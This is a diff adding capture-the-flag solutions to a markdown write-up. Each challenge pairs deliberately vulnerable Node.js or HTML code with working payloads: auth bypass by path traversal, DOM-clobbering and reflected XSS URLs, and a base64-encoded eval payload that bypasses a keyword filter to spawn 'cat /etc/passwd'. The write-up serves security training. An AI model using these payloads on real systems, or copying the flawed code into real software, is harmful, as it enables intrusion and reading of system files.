@@ -1236,15 +1236,400 @@ Never use `eval` nor `String(Function())` involving user input
 
 
 
+### **#20: API authentication Gateway**
+
+**Goal:** Get Grandpa Joe's user record (Id:670b0741-9fb1-4ef7-afe9-842120a12fcb) from the API
+
+**Code:**
+
+```javascript
+import express from 'express';
+const app = express();
+const app2 = express();
+import bodyParser from 'body-parser';
+app.use(bodyParser.json());
+app2.use(bodyParser.json());
+import dotenv from 'dotenv';
+import { CRMEntities } from './crm.mjs';
+import axios from 'axios';
+import { MongoClient } from 'mongodb';
+dotenv.config();
+const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+const requireAuthentication = ['getuser', 'getcompany'];
+
+app.post('/callApi', async (req, res) => {
+    let json = req.body;
+    let api = String(json.api)?.trim()?.toLowerCase();
+    let token = json.token;
+    try {
+        if (requireAuthentication.includes(api)) {
+            if (token == process.env.tokenSecret) {
+                const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json);
+                res.send(response.data);
+            } else {
+                res.send("Invalid token");
+            }  
+        } else {
+            const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json);
+            res.send(response.data);
+        }
+    } catch(e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    }
+});
+
+app2.post('/getUser', async (req, res) => {
+    const client = new MongoClient(process.env.MONGODB_URI);
+    try {
+        const userId = req.body.userId;
+        if(typeof(req.body) === 'object' && userId && userId.match(uuidFormat)) {
+            await client.connect();
+            const db = client.db("challenge_5");
+            const user = await db
+                .collection("users")
+                .find({ user_id: userId }) 
+                .maxTimeMS(5000)
+                .toArray()
+            res.send(JSON.stringify(user));
+        } else {
+            res.send("Invalid arguments provided");
+        }
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    } finally {
+        await client.close();
+    }
+})
+
+app2.post('/getCompanies', async (req, res) => {
+    const client = new MongoClient(process.env.MONGODB_URI);
+    try {
+        const companyId = req.body.companyId;
+        if(typeof(req.body) === 'object' && companyId && companyId.match(uuidFormat)) {
+            await client.connect();
+            const db = client.db("challenge_5");
+            const company = await db
+                .collection("companies")
+                .find({ company_id: companyId })
+                .maxTimeMS(5000)
+                .toArray();
+            res.send(JSON.stringify(company));
+        } else {
+            res.send("Invalid arguments provided");
+        }
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    } finally {
+        await client.close();
+    }
+})
+
+app2.post('/CRMEntities', async (req, res) => {
+    res.send(CRMEntities);
+})
+
+app.listen(process.env.externalPort, () => {
+    console.log(`External API listening on PORT ${process.env.externalPort}`)
+})
+
+// Internal service; accessible only from localhost
+app2.listen(process.env.internalPort, 'localhost', function() {
+    console.log(`Internal service started port ${process.env.internalPort}`);
+});
+```
+
+<br /><br />
+
+
+
+```
+POST /callApi
+
+{
+  "api": "../getUser",
+  "token": "a",
+  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
+}
+
+OR
+
+{
+  "api": "getUser/",
+  "token": "a",
+  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
+}
+
+OR
+
+{
+  "api": "./getUser",
+  "token": "a",
+  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
+}
+```
+
+<br />
+
+The response:
+
+```
+[
+  {
+    "_id": "646be35936948f6269964fb5",
+    "user_id": "670b0741-9fb1-4ef7-afe9-842120a12fcb",
+    "company_id": "08131488-05a1-4bfd-abf7-b70191867ee6",
+    "name": "Grandpa Joe",
+    "secret": "54c48e5a-d98c-4bc7-8998-c55c577f9906"
+  }
+]
+```
+
+
+
+<br /><br />
+
+
+
+### **#21: Menu Details**
+
+**Goal:** Inject an alert("Wizer")
+
+**Code:** 
+
+```html
+<html>
+<head>
+<title> Dashboard </title>
+<script src="purify.min.js"></script>
+</head>
+<body>
+    <h1>Dashboard</h1>
+
+    <p> <span id="name">Guest</span>, Welcome to the Dashboard
+    <a href="logout">Logout</a>
+    </p>
+    <p> <a href="profile">Profile</a> <span id="profileComment"></span></p>
+    <p> <a href="settings">Settings</a> <span id="settingsComment"></span></p>
+    <p> <a href="points">Points</a> (<span id="points">0</span>)</p>
+    <p> <a href="leaderboard">Leaderboard</a></p>
+</body>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    for (var [key, value] of urlParams) {
+        if(document.getElementById(key)) {
+            document.getElementById(key).innerText = `${value}`;
+        } else if (window.debugMode) {
+            document.write("unidentified keys <br/>");
+            document.write(`${key} = ${value} <br/>`);
+        } else {
+            key = DOMPurify.sanitize(key);
+            document.write(`<span style='color: red'>${key} not found in the document</span><br/>`);
+        }
+    }
+</script>
+</html>
+```
+
+The code below demonstrates a simple app menu that integrates values from a URL, matched according to field name. The url arguments are fetched and iterated though. For every key in the querystring, if it finds an element where the id matches the key name then it embeds the value as innerText. In case it doesn't find the element, for non-debug mode, it purifies the key and prints a message that the key isn't found, however, when window.debugMode = true, both the key and value are printed without sanitization.
+
+There are three issues with the code: (1) it enables debugMode using a global window argument which could be potentially shadowed by DOM Clobbering techniques, and (2) debugMode skips sanitization upon printing key/value, hence assuming you can activate this mode, you're able to print out HTML code including malicious scripts, and (3) An HTML injection is present when not in debug mode (Root cause of the DOM clobbering)
+
+
+
+<br /><br />
+
+
+
+### **#22: Calculator Level 2**
+
+**Goal:** Read the content of the OS's `passwd` file
+
+**Code:**
+
+```javascript
+const express = require('express')
+const bodyParser = require('body-parser');
+const app = express();
+require('dotenv').config();
+
+app.use(bodyParser.json());
+const unauthorizedKeywords = ["spawn", "spawnSync", "process"];
+
+const isValidInput = (input) => {
+    invalid = false;
+    unauthorizedKeywords.forEach((keyword) => {
+        if (input.indexOf(keyword) > -1) {
+            invalid = true;
+        }
+    });
+    return !invalid;
+}
+
+app.post('/calc', async (req, res) => {
+    try {
+        let json = req.body;
+        let calc = String(json.calculation);
+        if (!isValidInput(calc)) {
+            throw new Error("Invalid input");
+        }   
+        res.send(String(Function("return " + calc)()));
+    } catch (e) {
+        res.send(e.message);
+        console.error(e.message);
+    }
+})
+
+app.listen(process.env.port, () => {
+    console.log(`API listening on PORT ${process.env.port}`)
+})
+
+module.exports = app
+```
+
+There are multiple ways to bypass the validation, one such way is to use a combination of `eval(atob())` which hides keywords that are being looked for. However, that's not enough since we can't use the `require` command anymore since it's not present on this version, but we could still use `process.binding` to import `fs` and then use the `.internalModuleReadJSON('/etc/passwd')`. Another way around the validation is to break unallowed words into parts and then concatenate them in the code. For instance, we could use `pro` and `cess.binding` to bypass the validation and run eval on the textual command in order to import `fs`.
+
+
+
+<br /><br />
+
+
+
+From: https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822
+
+```javascript
+// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
+spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}
+
+// Defines spawnSync, the function that will do the actual spawning
+spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
+
+spawnSync('cat', ['/etc/passwd'])['output'][1];
+```
+
+<br />
+
+```
+{
+  "calculation": "eval(atob('Ly8gRGVmaW5lcyBzcGF3bl9zeW5jIGFuZCBub3JtYWxpemVTcGF3bkFyZ3VtZW50cyAod2l0aG91dCBlcnJvciBoYW5kbGluZykuIFRoZXNlIGFyZSBpbnRlcm5hbCB2YXJpYWJsZXMuCnNwYXduX3N5bmMgPSBwcm9jZXNzLmJpbmRpbmcoJ3NwYXduX3N5bmMnKTsgbm9ybWFsaXplU3Bhd25Bcmd1bWVudHMgPSBmdW5jdGlvbihjLGIsYSl7aWYoQXJyYXkuaXNBcnJheShiKT9iPWIuc2xpY2UoMCk6KGE9YixiPVtdKSxhPT09dW5kZWZpbmVkJiYoYT17fSksYT1PYmplY3QuYXNzaWduKHt9LGEpLGEuc2hlbGwpe2NvbnN0IGc9W2NdLmNvbmNhdChiKS5qb2luKCcgJyk7dHlwZW9mIGEuc2hlbGw9PT0nc3RyaW5nJz9jPWEuc2hlbGw6Yz0nL2Jpbi9zaCcsYj1bJy1jJyxnXTt9dHlwZW9mIGEuYXJndjA9PT0nc3RyaW5nJz9iLnVuc2hpZnQoYS5hcmd2MCk6Yi51bnNoaWZ0KGMpO3ZhciBkPWEuZW52fHxwcm9jZXNzLmVudjt2YXIgZT1bXTtmb3IodmFyIGYgaW4gZCllLnB1c2goZisnPScrZFtmXSk7cmV0dXJue2ZpbGU6YyxhcmdzOmIsb3B0aW9uczphLGVudlBhaXJzOmV9O30KCi8vIERlZmluZXMgc3Bhd25TeW5jLCB0aGUgZnVuY3Rpb24gdGhhdCB3aWxsIGRvIHRoZSBhY3R1YWwgc3Bhd25pbmcKc3Bhd25TeW5jID0gZnVuY3Rpb24oKXt2YXIgZD1ub3JtYWxpemVTcGF3bkFyZ3VtZW50cy5hcHBseShudWxsLGFyZ3VtZW50cyk7dmFyIGE9ZC5vcHRpb25zO3ZhciBjO2lmKGEuZmlsZT1kLmZpbGUsYS5hcmdzPWQuYXJncyxhLmVudlBhaXJzPWQuZW52UGFpcnMsYS5zdGRpbz1be3R5cGU6J3BpcGUnLHJlYWRhYmxlOiEwLHdyaXRhYmxlOiExfSx7dHlwZToncGlwZScscmVhZGFibGU6ITEsd3JpdGFibGU6ITB9LHt0eXBlOidwaXBlJyxyZWFkYWJsZTohMSx3cml0YWJsZTohMH1dLGEuaW5wdXQpe3ZhciBnPWEuc3RkaW9bMF09dXRpbC5fZXh0ZW5kKHt9LGEuc3RkaW9bMF0pO2cuaW5wdXQ9YS5pbnB1dDt9Zm9yKGM9MDtjPGEuc3RkaW8ubGVuZ3RoO2MrKyl7dmFyIGU9YS5zdGRpb1tjXSYmYS5zdGRpb1tjXS5pbnB1dDtpZihlIT1udWxsKXt2YXIgZj1hLnN0ZGlvW2NdPXV0aWwuX2V4dGVuZCh7fSxhLnN0ZGlvW2NdKTtpc1VpbnQ4QXJyYXkoZSk/Zi5pbnB1dD1lOmYuaW5wdXQ9QnVmZmVyLmZyb20oZSxhLmVuY29kaW5nKTt9fWNvbnNvbGUubG9nKGEpO3ZhciBiPXNwYXduX3N5bmMuc3Bhd24oYSk7aWYoYi5vdXRwdXQmJmEuZW5jb2RpbmcmJmEuZW5jb2RpbmchPT0nYnVmZmVyJylmb3IoYz0wO2M8Yi5vdXRwdXQubGVuZ3RoO2MrKyl7aWYoIWIub3V0cHV0W2NdKWNvbnRpbnVlO2Iub3V0cHV0W2NdPWIub3V0cHV0W2NdLnRvU3RyaW5nKGEuZW5jb2RpbmcpO31yZXR1cm4gYi5zdGRvdXQ9Yi5vdXRwdXQmJmIub3V0cHV0WzFdLGIuc3RkZXJyPWIub3V0cHV0JiZiLm91dHB1dFsyXSxiLmVycm9yJiYoYi5lcnJvcj0gYi5lcnJvciArICdzcGF3blN5bmMgJytkLmZpbGUsYi5lcnJvci5wYXRoPWQuZmlsZSxiLmVycm9yLnNwYXduYXJncz1kLmFyZ3Muc2xpY2UoMSkpLGI7fQoKc3Bhd25TeW5jKCdjYXQnLCBbJy9ldGMvcGFzc3dkJ10pWydvdXRwdXQnXVsxXTs='))"
+}
+```
+
+
+
+<br /><br />
 
 
 
 
 
+### **#23: Request Processor**
 
+**Goal:** Perform any valid request to get the flag
 
+**Code:**
 
+```javascript
+const express = require('express')
+const bodyParser = require('body-parser');
+const performAction = require('./actions');
+const app = express();
+require('dotenv').config();
+app.use(bodyParser.json());
 
+app.post('/request', async (req, res) => {
+    try {
+        let json = req.body;
+        let request = json.request;
+        if(request) {
+            // Request string format: "data:<data>,requestType:<requestType>,key:<key>," 
+            const requestTypeIndex = request.indexOf("requestType:");
+            const dataIndex = request.indexOf("data:");
+            const keyIndex = request.indexOf("key:");
+            const keyFound = keyIndex > 0;
+
+            if(requestTypeIndex < 0 || dataIndex < 0 || keyIndex < 0) {
+                res.status(401).send("Invalid request format: data:<data>,requestType:<requestType>,key:<key>,");
+                return;
+            } else if(keyFound) {
+                key = request.substring(keyIndex + 4).substring(0, request.substring(keyIndex + 4).indexOf(","));
+                if(key !== process.env.key) {
+                    res.status(401).send("invalid key");
+                    return;
+                }
+            }
+            const requestType = request.substring(requestTypeIndex + 12).substring(0, request.substring(requestTypeIndex + 12).indexOf(","));
+            const data = request.substring(dataIndex + 5).substring(0, request.substring(dataIndex + 5).indexOf(","));
+
+            res.send(performAction(requestType, data));
+            return;
+        } else {
+            res.status(401).send("missing request parameter");
+            return;
+        }
+    } catch (e) {
+        res.send(e.message);
+        console.error(e.message);
+    }
+})
+
+app.listen(process.env.port, () => {
+    console.log(`API listening on PORT ${process.env.port}`)
+})
+
+module.exports = app
+```
+
+> The code below is of a custom Request Processor, which is a NodeJS application that processes custom formatted requests from the user. The expected structure of the request is as stated in the comment: "data:<data>,requestType:<requestType>,key:<key>,". Upon receiving the request, the code splits the request into its parts and validates the key against the secret stored. If the key matches the secret stored, then the action is performed (within an external code, not included in this challenge), otherwise, an "invalid key" error is returned. Furthermore, in the following part of the code, a validation was added to ensure the existence of all the required fields in the request, which returns an error "Invalid request format: data:<data>,requestType:<requestType>,key:<key>," if one of the fields is missing:
+
+<br />
+
+An oversight of a minor logic error, makes it possible to trick the system and get in the crack created between the valid and the invalid structures. There are two validations for key existence: (1) const keyFound = keyIndex > 0; which is used to protect the key validation process and (2) A check of `keyIndex < 0` within the part that checks if all the expected elements exist. But what if keyIndex is exactly 0? The logic isn't actually validating the particular expected order of the fields.
+
+By providing the key as the first data field "key:xyz," in the request, the keyIndex will be 0, which means that we can pass the validation of existence and yet skip the verification of the key against the stored secret, since `keyIndex > 0` isn't true. This way, an attacker could perform any action without the key.
+
+<br />
+
+```
+{
+  "request": "key:xyz,data:ggg,requestType:ddd,"
+}
+```
+
+<br />
+
+**Debugging Code:**
+
+```
+// Request string format: "data:<data>,requestType:<requestType>,key:<key>," 
+let request = "key:aaa,data:bbb,requestType:ccc,";
+const requestTypeIndex = request.indexOf("requestType:");
+const dataIndex = request.indexOf("data:");
+const keyIndex = request.indexOf("key:");
+const keyFound = keyIndex > 0;
+
+console.log("keyIndex: ",keyIndex, "keyFound ", keyFound);
+if(requestTypeIndex < 0 || dataIndex < 0 || keyIndex < 0) {
+    console.log("Invalid request format: data:<data>,requestType:<requestType>,key:<key>,");
+} else if(keyFound) {
+    console.log("in else if");
+    key = request.substring(keyIndex + 4).substring(0, request.substring(keyIndex + 4).indexOf(","));
+    console.log("key: ",key);
+
+    if(key !== "dhkwnkjdfnkjewnfwjbf") {
+        console.log("invalid key");
+
+    }
+}
+const requestType = request.substring(requestTypeIndex + 12).substring(0, request.substring(requestTypeIndex + 12).indexOf(","));
+console.log("requestType: ", requestType);
+const data = request.substring(dataIndex + 5).substring(0, request.substring(dataIndex + 5).indexOf(","));
+console.log("data: ", data);
+```
+
+<br /><br />
 
 
 
@@ -1618,13 +2003,247 @@ POST /checkKeyValidity
 
 ### \#39: CHATROOM
 
+```javascript
+const socket = io();
+
+const messages = document.getElementById('messages');
+const chatForm = document.getElementById('chat-form');
+const usernameInput = document.getElementById('username');
+const iconInput = document.getElementById('icon');
+const messageInput = document.getElementById('message');
+const urlParams = new URLSearchParams(window.location.search);
+
+chatForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  const user = usernameInput.value.trim();
+  const icon = iconInput.value; // Get selected icon value
+  const text = messageInput.value.trim();
+  if (!user || !text) return;
+  socket.emit('chat message', { user, icon, text });
+  messageInput.value = '';
+});
+
+socket.on('message', (msg) => {
+  const user = msg.user;
+  const text = msg.text;
+  let icon = msg.icon;
+  if (icon.emoji == "") {
+    icon = window.defaultIcon || {"emoji": "🏴"}
+  }
+
+  const messageElement = document.createElement('div');
+  messageElement.classList.add('message');
+  const displayName = icon ? `${icon.emoji} ${user}` : user;
+  messageElement.innerHTML = `<strong>${displayName}:</strong> ${text}`;
+  messages.appendChild(messageElement);
+  messages.scrollTop = messages.scrollHeight; // Auto-scroll to the latest message
+});
+
+const queryMessages = urlParams.get('messages')?.split(',') || [];
+usernameInput.value = urlParams.get('username') || usernameInput.value;
+
+for (let i = 0; i < queryMessages.length; i++) {
+  messageInput.value = queryMessages[i];
+  chatForm.dispatchEvent(new Event('submit'));
+}
 ```
-https://chal39-rfh85-a4e8a8b41487.herokuapp.com/?username=1234 kkkkk&messages=741,<div id="icon"> <span id="emoji">888</span> </div>,123
 
+The defaultIcon variable is stored on the window object, and hence is vulnerable for over-shadowing a.k.a. DOM Clobbering.
 
+In looking at the following code, the defaultIcon is being used whenever the `icon.emoji` property is empty
 
-https://chal39-rfh85-a4e8a8b41487.herokuapp.com/?username=1234 kkkkk&messages=741,<div id="defaultIcon"> <span id="emoji">888</span> </div>,123
+This means that an attacker would need to skip the icon initially. Since the code does not offer an option to provide an icon, it is easy for the attacker to craft a URL to trigger the exploit. The attacker would then create a URL to overshadow the defaultIcon variable with a new element using DOM Clobbering. But how would the attacker fill the emoji property with a malicious script? The goal here is to print out a tag that will make `window.defaultIcon.emoji` include some malicious script. Fortunately for the attacker, it is possible to overshadow inner properties by adding another element with a property named `emoji` on it. Something like this: (non-escaped form): `<a id=defaultIcon><a id=defaultIcon name=emoji href="cid:<img src=x onerror=alert('HACKED')>">` Finally, to trigger an alert with the word `HACKED`, the attacker could post another dummy message (using the same URL - comma separated) under any username, which will execute the script.
+
 ```
+https://chal39-rfh85-a4e8a8b41487.herokuapp.com/?username=1&messages=<a id=defaultIcon><a id=defaultIcon name=emoji href="cid:<img src=x onerror=alert('HACKED')>">,123
+```
+
+
+
+
+
+### #40: **API GATEWAY #2**
+
+**Goal:** Get Grandpa Joe's user record (Id:670b0741-9fb1-4ef7-afe9-842120a12fcb) from the API
+
+**Code**
+
+```javascript
+import express from 'express';
+const app = express();
+const app2 = express();
+import bodyParser from 'body-parser';
+app.use(bodyParser.json());
+app2.use(bodyParser.json());
+import dotenv from 'dotenv';
+import { CRMEntities } from './crm.mjs';
+import axios from 'axios';
+import { MongoClient } from 'mongodb';
+dotenv.config();
+const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+const requireAuthentication = ['getuser', 'getcompany'];
+const allowedVerbs = ['GET', 'POST'];
+
+app.post('/callApi', async (req, res) => {
+    let json = req.body;
+    let api = String(json.api)?.trim();
+    let apiName = api.indexOf('.') >= 0  ? api.substring(0, api.lastIndexOf('.')) : api;
+    apiName = apiName.replaceAll('/', '').replaceAll('#', '').replaceAll('?', '');
+    let verb  = json.api.substring(json.api.lastIndexOf('.') + 1);
+    // default to POST if no verb is provided
+    if(verb === apiName) {
+        verb = 'POST';
+    }
+    console.log("api:", apiName, "verb:", verb);
+
+    let token = json.token;
+    let response;
+    try {
+        if (requireAuthentication.includes(apiName.toLowerCase())) {
+            if(!allowedVerbs.includes(verb)) {
+                res.send("Invalid verb");
+                return;
+            }
+            if (token == process.env.tokenSecret) {
+                switch (verb) {
+                    case 'GET':
+                        response = await axios.get(`http://localhost:${process.env.internalPort}/${apiName}`);
+                        res.send(response.data);
+                        break;
+                    case 'POST':
+                        response = await axios.post(`http://localhost:${process.env.internalPort}/${apiName}`, json);
+                        res.send(response.data);
+                        break;
+                    default:
+                        res.send("Invalid verb");  
+                }
+            } else {
+                res.send("Invalid token");
+            }  
+        } else {
+            // remove the verb from the api and default to POST
+            apiName = api.replaceAll('.POST', '').replaceAll('.GET', '');
+            const response = await axios.post(`http://localhost:${process.env.internalPort}/${apiName}`, json);
+            res.send(response.data);
+        }
+    } catch(e) {
+        res.status(500).end(e.message);
+        console.error(e.message);
+    }
+});
+
+app2.post('/getUser', async (req, res) => {
+    const client = new MongoClient(process.env.MONGODB_URI);
+    try {
+        const userId = req.body.userId;
+        if(typeof(req.body) === 'object' && userId && userId.match(uuidFormat)) {
+            await client.connect();
+            const db = client.db("challenge_5");
+            const user = await db
+                .collection("users")
+                .find({ user_id: userId }) 
+                .maxTimeMS(5000)
+                .toArray()
+            console.log(user);
+            res.send(JSON.stringify(user));
+        } else {
+            res.send("Invalid arguments provided");
+        }
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    } finally {
+        await client.close();
+    }
+})
+
+app2.post('/getCompanies', async (req, res) => {
+    const client = new MongoClient(process.env.MONGODB_URI);
+    try {
+        const companyId = req.body.companyId;
+        if(typeof(req.body) === 'object' && companyId && companyId.match(uuidFormat)) {
+            await client.connect();
+            const db = client.db("challenge_5");
+            const company = await db
+                .collection("companies")
+                .find({ company_id: companyId })
+                .maxTimeMS(5000)
+                .toArray();
+            console.log(company);
+            res.send(JSON.stringify(company));
+        } else {
+            res.send("Invalid arguments provided");
+        }
+    } catch (e) {
+        res.status(500).end(e.message);
+        console.error(e);
+    } finally {
+        await client.close();
+    }
+})
+
+app2.post('/CRMEntities', async (req, res) => {
+    res.send(CRMEntities);
+})
+
+app.listen(process.env.externalPort, () => {
+    console.log(`External API listening on PORT ${process.env.externalPort} `)
+})
+
+// Internal service; accessible only from localhost
+app2.listen(process.env.internalPort, 'localhost', function() {
+    console.log(`Internal service started port ${process.env.internalPort}`);
+});
+```
+
+
+
+
+
+```json
+{
+  "api": "getUser/ .GET",
+  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
+}
+```
+
+
+
+**Debugging code:**
+
+```javascript
+const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+const requireAuthentication = ['getuser', 'getcompany'];
+const allowedVerbs = ['GET', 'POST'];
+
+let json = {"api":"getUser/ .GET"};
+let api = String(json.api)?.trim();
+console.log("api: ", api);
+let apiName = api.indexOf('.') >= 0  ? api.substring(0, api.lastIndexOf('.')) : api;
+console.log("apiName: ", apiName);
+apiName = apiName.replaceAll('/', '').replaceAll('#', '').replaceAll('?', '');
+console.log("apiName2 : ", apiName);
+let verb  = json.api.substring(json.api.lastIndexOf('.') + 1);
+console.log("verb: ", verb);
+// default to POST if no verb is provided
+if(verb === apiName) {
+    verb = 'POST';
+}
+console.log("api:", apiName, "verb:", verb);
+
+if (requireAuthentication.includes(apiName.toLowerCase())) {
+    if(!allowedVerbs.includes(verb)) {
+        console.log("Invalid verb");
+        
+    }
+}else {
+    // remove the verb from the api and default to POST
+    apiName = api.replaceAll('.POST', '').replaceAll('.GET', '');
+    console.log("From else apiName: ",apiName, json )
+}
+```
+
+
 
 
 
@@ -1699,7 +2318,7 @@ OR
 
 <br />
 
-Debugging code:
+**Debugging code:**
 
 ```javascript
 const isValid = (value) => {
@@ -2076,6 +2695,24 @@ app.listen(process.env.PORT, () => {
 
 <br />
 
+
+
+```
+(() => {const flag = getFlag();userDatabase.admin.role = flag; return {username: 'admin'} ;})()
+
+OR
+
+function(){const flag = getFlag();userDatabase.admin.role = flag; return {username: 'admin'} ;}()
+
+OR
+
+(function(){const flag = getFlag();userDatabase.admin.role = flag; return {username: 'admin'} ;})()
+```
+
+
+
+
+
 **Debugging code:**
 
 ```javascript
@@ -2110,7 +2747,80 @@ if (session && userDatabase[session.username]) {
 
 
 
+
+
+
+
+### **#45: COMMENTS**
+
+**Goal:** Inject an alert("Wizer")
+
+**Code:**
+
+```javascript
+import { config } from 'dotenv';
+config();
+import express from 'express';
+import marked from 'marked';
+var ssn;
+const app = express();
+app.use(express.urlencoded({ extended: true })); // Built-in Express parser
+app.use(express.json());
+const sessions = {};
+
+const getSession = (req) => {
+    const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
+    const sid = req.query.sid;
+    if(sid && sid.match(uuidFormat)){
+        if(ssn = sessions[sid]){
+            //Session found
+            ssn = sessions[sid];
+        } else {
+            //Session not found
+            ssn = sessions[sid] = {};
+        }
+    } else {
+        ssn = {};
+    }
+    return ssn;
+};
+
+// Homepage
+app.get('/', (req, res) => {
+    ssn = getSession(req);
+    ssn.comments = ssn.comments || [];
+    res.send(`
+        <h1>Leave a Comment</h1>
+        <form action="/comment?sid=${req.query.sid}" method="POST">
+            <textarea style="width:250px;height:150px" name="content"></textarea><br>
+            <button type="submit">Submit</button>
+        </form>
+        <h2>Comments</h2>
+        ${ssn.comments.join('<br>')}
+    `);
+});
+
+// Store and Render User Comments
+app.post('/comment', (req, res) => {
+    const userInput = req.body.content;
+    const renderedContent = marked.parse(userInput);
+    ssn = getSession(req);
+    ssn.comments = ssn.comments || [];
+    ssn.comments.push(renderedContent);
+    res.redirect('/?sid=' + req.query.sid);
+});
+
+app.listen(process.env.PORT, () => {
+    console.log(`Server running at http://localhost:${process.env.PORT}`);
+});
 ```
 
+
+
+```html
+https://chal45-h8f5i.vercel.app/?sid=550e8400-e29b-41d4-a716-446655440000%22%0A%0D%3C/form%3E%3Cimg%20src=x%20onerror=alert(%22Wizer%22)%3E
+
+
+https://chal45-h8f5i.vercel.app/?sid=550e8400-e29b-41d4-a716-446655440000"%0a%0d</form><img src=x onerror=alert("Wizer")>
 ```
 
